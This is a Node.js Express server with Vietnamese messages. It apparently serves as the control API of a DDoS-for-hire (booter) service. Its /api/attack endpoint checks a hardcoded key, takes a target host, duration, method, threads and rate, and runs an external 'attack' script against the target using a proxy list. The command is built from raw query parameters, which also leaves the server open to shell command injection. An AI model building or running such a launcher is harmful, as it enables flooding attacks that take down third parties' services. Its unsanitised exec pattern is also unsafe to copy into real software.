const express = require("express"), { exec } = require("child_process");
const app = express(), port = 8080, MAX_CONCURRENT_ATTACKS = 1;
let activeAttacks = 0, currentPID = null;

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 300) return "THỜI GIAN PHẢI < 300S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command, res, host, port, time, method) => {
  exec(command, (error, stdout, stderr) => {
    activeAttacks--; currentPID = null;
    if (stderr) console.error(stderr);
  });
  currentPID = Math.floor(Math.random() * 10000) + 1;
  res.status(200).json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI", host, port, time, method, pid: currentPID });
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul, threads, rate } = req.query;
  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage)
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  activeAttacks++;
  const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
  executeAttack(command, res, host, port, time, method);
});

app.listen(port, () => console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`));
